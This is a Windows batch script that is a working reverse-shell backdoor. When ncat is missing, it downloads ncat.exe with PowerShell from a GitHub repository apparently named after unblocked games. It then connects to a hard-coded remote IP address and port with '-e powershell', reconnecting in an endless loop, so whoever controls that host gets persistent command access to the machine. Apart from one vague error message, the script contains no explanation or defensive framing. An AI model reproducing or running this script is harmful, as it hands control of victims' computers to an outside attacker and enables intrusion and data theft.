@echo off
setlocal

set "host=147.185.221.20"
set "port=45895"

:: Check if ncat is installed
where ncat >nul 2>&1
if %errorlevel%==0 (
    set "ncat_path=ncat"
    goto ncat
)

:: Set variables
set "url=https://github.com/unblockedgames2/zvgfd/blob/main/ncat.exe?raw=true"
set "installer=ncat.exe"
set "tempfile=%temp%\%installer%"

:: Download the installer
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %tempfile%"

:: Check if the download was successful
if not exist "%tempfile%" (
    echo Error Code 2
    goto :eof
)

:: Set the path to the downloaded ncat
set "ncat_path=%tempfile%"

:ncat
%ncat_path% %host% %port% -e powershell
goto ncat

:end
endlocal
